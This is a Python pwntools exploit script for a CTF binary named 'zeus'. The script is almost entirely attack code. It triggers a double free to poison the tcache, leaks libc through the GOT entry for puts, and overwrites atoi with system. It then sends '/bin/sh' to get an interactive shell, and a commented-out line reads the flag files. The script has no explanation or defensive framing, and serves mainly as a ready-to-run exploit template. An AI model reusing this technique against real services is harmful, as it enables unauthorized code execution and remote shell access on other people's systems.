#!/usr/bin/env python
from pwn import *
import sys, os

gdbcmd = 'b *0x004011ca'

context.terminal = 'kitty @ new-window --new-tab --tab-title pwn --keep-focus sh -c'.split()
# context.log_level = 'warn'

if sys.argv.__len__() == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
    libc = ELF('./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so', checksec=False)
else:
    # r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False, env={'LD_PRELOAD':'./libc-2.28-9dc614ec33ee0284064ec5535bda431c.so'})
    # r = process('/home/vagrant/ctf/cj/p11-zeus/zeus', aslr=False)
    r = process('/home/vagrant/ctf/cj/p11-zeus/zeus')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    gdb.attach(r, gdbcmd)

def insert(key, val):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', len(key).__str__())
    r.sendlineafter(': ', key)
    r.sendlineafter(': ', len(val).__str__())
    r.sendlineafter(': ', val)
    # r.recvline(False)
    # log.info(r.recvline(False))

def delete(key):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(': ', key)
    # log.info(r.recvline(False))

def lookup(key):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(': ', key)
    r.recvuntil(': ')
    return r.recvline(False)

insert('A' * 8, 'a' * 8)
insert('B' * 8, 'b' * 8)

delete('B' * 8)
delete('A' * 8)
delete('B' * 8)

fake_list = p64(0x602078) # tcache_entries -> got
fake_list += p64(0x00400505) # key : str.malloc
fake_list += p64(0x602020) # value : reloc.puts
fake_list += p64(0) # next

insert('A' * 8, fake_list)

puts = u64(lookup('malloc').ljust(8, '\x00'))
libc.address = puts - libc.symbols['puts']
# log.info(hex(libc.address))

insert('B' * 8, 'b' * 8)

payload  = p64(libc.symbols['realloc']) # realloc
payload += p64(libc.symbols['setvbuf']) # setvbuf
payload += p64(libc.symbols['system']) # atoi -> system
payload += p64(libc.symbols['exit']) # exit

insert('B' * 8, payload)

r.sendlineafter('>> ', '1')
r.sendlineafter(': ','/bin/sh')

# r.sendline('cat /var/flag/*')
# print r.recvline(False)

r.interactive()